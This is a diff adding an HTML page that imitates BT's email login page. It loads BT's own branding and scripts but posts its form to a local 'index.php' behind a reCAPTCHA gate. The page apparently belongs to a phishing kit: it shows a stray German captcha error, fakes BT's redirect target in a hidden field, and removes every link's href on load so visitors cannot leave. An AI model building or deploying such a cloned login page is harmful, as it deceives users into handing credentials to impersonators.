@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="description" content="BT">
+<meta name="keywords" content="BT">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
+<META HTTP-EQUIV="EXPIRES" CONTENT="-1">
+<title>Email Login Page</title>
+<meta name="referrer" content="origin" id="meta_referrer" />
+<!-- START: Code changes for DANTE-4085 -->
+<meta name="referrer" content="origin-when-cross-origin" id="meta_referrer" />
+<!-- END: Code changes for DANTE-4085 -->
+<!-- shortcut icon -->
+<!-- START: Code changes for DANTEAPP12074-10 BT Re brand- New Favicon image is not displaying in email login page -->
+<link rel="shortcut icon" href="//img01.bt.co.uk/s/assets/191120/images/logo/favicon.ico">
+<link rel="apple-touch-icon" href="//img01.bt.co.uk/s/assets/191120/images/logo/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="152x152" href="//img01.bt.co.uk/s/assets/191120/images/logo/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="//img01.bt.co.uk/s/assets/191120/images/logo/apple-touch-icon-180x180.png">
+<link rel="apple-touch-icon" sizes="167x167" href="//img01.bt.co.uk/s/assets/191120/images/logo/apple-touch-icon-167x167.png">
+<!-- END: Code changes for DANTEAPP12074-10 BT Re brand- New Favicon image is not displaying in email login page -->
+<!--[if IE 7 ]><link rel="stylesheet" href="//img01.bt.co.uk/s/assets/191120/css/ie7.css"> <![endif]-->
+<!--[if IE 8 ]><link rel="stylesheet" href="//img01.bt.co.uk/s/assets/191120/css/ie8.css?v=null"> <![endif]-->
+<!--[if IE 9 ]><link rel="stylesheet" href="//img01.bt.co.uk/s/assets/191120/css/ie9.css"> <![endif]-->
+
+<link href="//img01.bt.co.uk/s/assets/191120/home/css/email-login.css" rel="stylesheet">
+<link href="//img01.bt.co.uk/s/assets/191120/home/css/main.css" rel="stylesheet">
+<link href="//img01.bt.co.uk/s/assets/191120/css/responsive-menu.css" rel="stylesheet">
+
+<!-- Start : DTM data layer -->
+<script>	
+			var analyticsPageName = 'Con:Email:Login Page';
+			if (analyticsPageName == ""){
+				analyticsPageName = "Con:Email:Login page";
+			}
+			var tar = analyticsPageName.split(":");
+			var formTarget = "Email";
+			if (tar.length >= 2) {
+				formTarget = tar[1];
+			}	
+		</script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/login-datalayer.js"></script>
+<!-- End : DTM data layer -->
+<script src="//img01.bt.co.uk/s/assets/191120/sport/js/libs/jquery/1.10.2/jquery-1.10.2.min.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/home/js/utilities.js"></script>
+<script async src="//img01.bt.co.uk/s/assets/191120/sport/js/libs/lazysizes/2.0.0/lazysizes.min.js"></script>
+<script async src="//img01.bt.co.uk/s/assets/191120/home/js/email-login/email-login.min.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/modernizr_jquery_cookies.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/sha256.js"></script>
+<script>
+		var omni = omni || {}, ads = ads || {}, user = window.namespace.user || {}; 
+		var static_root = '//img01.bt.co.uk/s/assets/191120';
+		var pagename = "null";
+	</script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/aref.min.js"></script>
+<script>
+		var cookieutilities = {
+				getCookie : function(cookiename) {
+					var cookiestring = "" + document.cookie;
+					var index1 = cookiestring.indexOf(cookiename);
+					if (index1 == -1 || cookiename == "")
+						return "";
+					var index2 = cookiestring.indexOf(';', index1);
+					if (index2 == -1)
+						index2 = cookiestring.length;
+					return unescape(cookiestring.substring(index1 + cookiename.length + 1,
+							index2));
+				},		
+				getCookieStatus : function(c_name) {
+					var flag = false;
+					var i, x, ARRcookies = document.cookie.split(";");
+					for (i = 0; i < ARRcookies.length; i++) {
+						x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
+						x = x.replace(/^\s+|\s+$/g, "");
+						if (x == c_name) {
+							flag = true;
+							return flag;
+						}
+					}
+					return flag;
+				}
+			};
+		</script>
+
+<!-- Start : DTM Launch library -->
+<script src="//assets.adobedtm.com/launch-ENfdadf1bb09d848de85923e05be32e7d1.min.js" async></script>
+<!-- End : DTM Launch library -->
+
+<script>
+	var static_root = '//img01.bt.co.uk/s/assets/191120';
+</script>
+
+<script src='https://www.google.com/recaptcha/api.js'></script>
+</head>
+
+<style type="text/css">
+	body {
+		margin: 0px;
+	}
+	loading {
+		position: relative;
+		height: 500px;
+		clear:both;
+	}
+	.loading span {
+		position:absolute;
+		background:url(//img01.bt.co.uk/s/assets/191120/images/loader.gif) no-repeat center center;
+		height:100%;
+		width:100%;
+	}
+</style>
+<body id="emailLogin">
+<div class="loading" style="display:none">
+<span>
+</span>
+</div>
+<div id="displayPage">
+<div class="hideslot"> </div>
+<div id="tv-section-page" class="container-fluid full-width">
+<!--Dante New Global header started-->
+<nav id="bt-navbar">
+</nav>
+<script src="js/dantenewgh.api-1.0.js"></script>
+<script>
+		var navconfig={"displayGlobalSearch":"N","displayMobileSearch":"Y","activePage":"email"};
+		DanteNewGH.init(navconfig);
+</script>
+<!--Dante New Global header ended-->
+
+
+<div id="main-content" class="tv-article none">
+<div class="hero" id="hero">
+<div id="fullskin">
+<!-- Ads are disabled-->
+
+</div>
+
+<div class="container container-main-content">
+<div class="row">
+<div class="col-xs-12 col-md-4 col-md-push-8 col-lg-push-8 col-lg-4 rhr-col">
+	&nbsp;
+</div>
+<div class="col-xs-12 col-md-4">
+
+<script src="//img01.bt.co.uk/s/assets/191120/aauth/js/ArcotAdapterIntegration.js"></script>
+<div id="page-wrapper" class="email-signin-wrapper">
+<div class="row">
+<!-- Yahoo overlay switch -->
+<!--Modal overlay starts -->
+<div class="modal-backdrop in overlay-hide"></div>
+<div class=" modal overlay-hide" id="myModal-overlay" style="display:block">
+<div class="modal-dialog modal-dialog-centered">
+<!-- sample Modal overlay starts--> <div class="modal" id="myModal-overlay"> <div class="modal-dialog modal-dialog-centered"> <div class="modal-content"> <div class="overlay-logo"> <img alt="BT logo" src="/s/assets/aauth/images/BT_logo.png"> </div><br> <div class="overlay-margin10"><span class="overlay-header">If youre using an internet browser</span> <span class="overlay-body">(like Internet Explorer or Google Chrome)</span></div> <div class="overlay-body"> You may be using an old link, to view your email please go to <a href="https://www.bt.com/email">https://www.bt.com/email</a> </div> <br> <br> <div class="overlay-header">Setting up your email?</div> <div class="overlay-body"> It looks like you might have selected Yahoo when setting up your email, please select Other and then enter your email address and password. </div> <br> <br> <div class="overlay-header">Using the Yahoo mail mobile app? </div> <div class="overlay-body">Sorry, we dont support new setups via the app anymore.</div> <br> <div class="overlay-body"> <a href="https://www.bt.com/setup/email"> More information </a></div> <br><br> </div> </div> </div>
+
+</div>
+</div>
+<!-- Modal overlay Ends -->
+
+<div class="main-amber">
+<!--<style>
+.error-header a{
+color: #fff;
+text-decoration: underline;
+}
+</style>
+-->
+<!-- BT MAIL ALERT ON AMBERR -->
+<!-- <div class="submit-warning">
+<div class="pull-left yellow-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+We've had reports of a problem with BT Mail. We're working to establish what's wrong and will provide updates soon. Sorry if you're affected.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- BT WEB MAIL ALERT ON AMBERR -->
+<!-- <div class="submit-warning">
+<div class="pull-left yellow-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+We've had reports of a problem access BT Mail via webmail. If you can't access your email account via webmail, please use an Email client. We are working to establish what's wrong and will provide updates soon. Sorry if you're affected.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- BT YAHOO MAIL ALERT ON AMBER -->
+<!-- <div class="submit-warning">
+<div class="pull-left yellow-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+We've had reports of a problem with BT Yahoo Mail. We're working to establish what's wrong and will provide updates soon. Sorry if you're affected.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- EMAIL ALERT ON AMBER -->
+<!-- <div class="submit-warning">
+<div class="pull-left yellow-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+We've had reports of a problem with Email. We're working to establish what's wrong and will provide updates soon. Sorry if you're affected.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- BT MAIL ALERT ON RED -->
+<!-- <div class="submit-error">
+<div class="pull-left red-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+Sorry, but we're having problems with BT Mail. We're working to get them sorted as soon as possible.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- BT YAHOO MAIL ALERT ON RED -->
+<!-- <div class="submit-error">
+<div class="pull-left red-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+Sorry, but we're having problems with BT Yahoo Mail. We're working to get them sorted as soon as possible.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- EMAIL ALERT ON RED -->
+<!-- <div class="submit-error">
+<div class="pull-left red-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+Sorry, but we're having problems with Email. We're working to get them sorted as soon as possible.
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+<!-- NO ERROR ALERT ON Green () -->
+<!-- <div class="submit-green">
+<div class="pull-left green-image">
+</div>
+<div class="error-text-wrapper">
+<div class="error-header">
+We're revamping BT Mail to make it even better. Find out more <a href = "https://community.bt.com/t5/Email/We-re-revamping-BT-Mail-to-make-your-experience-better-than-ever/td-p/1974938">here</a>
+</div>
+</div>
+</div>
+<div class="clear-both"></div>
+-->
+
+</div>
+<div class="loginerror generic-error" style="display:none">Please check you entered your username and password correctly and try again. If you need help remembering your username or password you can use the links below.</div>
+<div class="loginerror lock-error" style="display:none">You have had too many unsuccessful attempts to login. You have been temporarily locked out. Please try after 15 minutes.</div>
+<!--Start:error Login Section-->
+<noscript>
+<div id="noscripterrorcontainer" class="main-amber showslot">
+<div class="submit-error">
+<div class="pull-left red-image"></div>
+<div class="error-text-wrapper">
+<div class="error-header">
+You've disabled JavaScript on the browser. Please enable it prior to continuing.
+</div>
+</div>
+</div>
+</div>
+</noscript>
+<div id="errorcontainer" class="main-amber hideslot">
+<div class="submit-error">
+<div class="pull-left red-image"></div>
+<div class="error-text-wrapper">
+<!-- <div id="loginpageerror0" class="error-header hideslot"> Your session has been timed out. Please try again. </div> -->
+<div id="loginpageerror1" class="error-header hideslot"> You've disabled cookies on the browser. Please enable it prior to continuing. </div>
+<div id="loginpageerror2" class="error-header hideslot"> Please check you entered your username and password correctly and try again. If you need help remembering your username or password you can use the links below. </div>
+<div id="loginpageerror3" class="error-header hideslot"> You have had too many unsuccessful attempts to login. You have been temporarily locked out. Please try after 20 minutes. </div>
+<div id="loginpageerror4" class="error-header hideslot"> Invalid passcode. Identity verification on any device using your present methods have been locked for 20 minutes. </div>
+<div id="loginpageerror5" class="error-header hideslot"> Invalid passcode. Please try again. </div>
+<div id="loginpageerror6" class="error-header hideslot"> Something went wrong. Please try again. </div>
+</div>
+</div>
+</div>
+<div class="email-login-wrapper customloginlb">
+<div id="bespoketoggle" style="display:none;"> <div style="color:#000000 ;margin-top: 8px;">To manage your account, view your bill or access other BT services, you need to login using your BT ID.</div> <br></div>
+<form action='index.php' method='post' name='frm' id='frm'>
+<input type='hidden' name='g-recaptcha-response_data' id='g-recaptcha-response_data' value=''>
+<div class="smtarget">
+<input type="hidden" name="TARGET" value='https://home.bt.com/secure/loginforwardaaeb?view=btmail&redirectURL=https://home.bt.com'/>
+</div>
+
+<div class="error-messsage" >
+<p>Captcha-Validierung erforderlich!</p>
+</div>
+
+<div class="error-messsage" >
+<p>Verify you are human.</p>
+
+</div>
+<div class="form-group">
+
+<div class="g-recaptcha" style='padding-left:25px;' data-sitekey="6LfoMhkaAAAAALPngTOBT1I_pxLZKKAssUA-fkNg"></div>
+</div>
+
+<div>
+
+</div>
+
+<div class="sign-btn-wrapper">
+<div class="sign-btn-align">
+<input id="dev_sign_in" tabindex="9" type="button" value="Submit" class="btn btn-primary email-btn-primary"/>
+</div>
+<div class="checkbox-align-right">
+
+</div>
+
+</div>
+
+<div class="loadFont clearfix"></div>
+<!-- Email_Loginpage_EULaw -->
+<p id="EULaw" class="EULaw" style="display:none">By logging in I agree that cookies may be set on my browser. <a href="http://my.bt.com/btmail/cookies" target="_blank" tabindex="7">Learn more</a></p>
+
+<div class="email-helplinks">
+</div>
+</form>
+<div id="yahooMPUMessage" class="email-MPUmessage">
+<style> #emailLogin .sec-btn-group { display:none;} #emailLogin .email-MPUmessage { border-top: none; margin: 0;} </style>
+
+</div>
+<div class="sec-btn-group">
+
+
+</div>
+</div>
+</div>
+</div>
+<script>
+		var ua=window.navigator.userAgent;if('on'=='on'){$('#shpwdlbl').show()}else{$('#shpwdlbl').hide()}
+		if(navigator.userAgent.match(/Android/i)||navigator.userAgent.match(/webOS/i)||navigator.userAgent.match(/iPhone/i)||navigator.userAgent.match(/iPad/i)||navigator.userAgent.match(/iPod/i)||navigator.userAgent.match(/BlackBerry/i)||navigator.userAgent.match(/Windows Phone/i)){$('#shpwdlbl').bind('touchstart',function(){$('[name="NAFMPASSWORD"]').prop("type",'text');$('#shpwdlbl').css("font-weight",'bold')});$('#shpwdlbl').bind('touchend',function(){$('[name="NAFMPASSWORD"]').prop("type",'password');$('#shpwdlbl').css("font-weight",'normal')})}
+		else{$('#shpwdlbl').mousedown(function(){$('[name="NAFMPASSWORD"]').prop("type",'text');$('#shpwdlbl').css("font-weight",'bold')});$('#shpwdlbl').mouseup(function(){$('[name="NAFMPASSWORD"]').prop("type",'password');$('#shpwdlbl').css("font-weight",'normal')})
+		$('#shpwdlbl').mouseleave(function(){$('[name="NAFMPASSWORD"]').prop("type",'password');$('#shpwdlbl').css("font-weight",'normal')})}
+	</script>
+<div class="clearfix"></div>
+
+<!-- EmailLoginPage RightColumn Slots -->
+
+</div>
+
+</div>
+<div></div>
+
+</div>
+</div>
+<!--Dante New Global footer started-->
+<script src="//img01.bt.co.uk/s/assets/191120/js/dantegf.api-1.0.js"></script>
+<script>
+		var footerconfig={};
+		DanteGF.init(footerconfig);
+	</script>
+<footer id="bt-footer">
+</footer>
+<!--Dante New Global footer ended-->
+
+<script src="//img01.bt.co.uk/s/assets/191120/home/js/search/homepage-search.min.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/home/js/ellipsis/ellipsis.min.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/home/js/ellipsis/config.min.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/sha256.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/login.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/core.js"></script>
+<script src="//img01.bt.co.uk/s/assets/191120/js/jquery-ui-1.9.2.custom.min.js"></script>
+<script>
+	function downloadJSAtOnload(){
+	var t=document.createElement("script");t.src="//img01.bt.co.uk/s/assets/191120/globalheader/bt.cookies.js";document.body.appendChild(t)}
+	if(window.addEventListener)window.addEventListener("load",downloadJSAtOnload,false);else if(window.attachEvent)window.attachEvent("onload",downloadJSAtOnload);else window.onload=downloadJSAtOnload
+</script>
+
+<link href="//img01.bt.co.uk/s/assets/191120/home/css/footer-adjuster.css" rel="stylesheet">
+<script src="//img01.bt.co.uk/s/assets/191120/home/js/email-login/footer-adjuster.min.js"></script>
+
+    <script type="text/javascript">
+		$('#dev_sign_in').on('click', function () {
+			
+			//alert($('textarea[id="g-recaptcha-response"]').val());
+			//return false;
+			recaptcha = $('#g-recaptcha-response_data').val($('textarea[id="g-recaptcha-response"]').val());
+			
+			if (recaptcha !='') {
+				$('#frm').submit();
+			}
+		});
+		
+		$(window).load(function(){ 
+			$("a").removeAttr("href").css("cursor","pointer");
+		})
+		
+		
+    </script>
+</div>
+</body>
+</html>
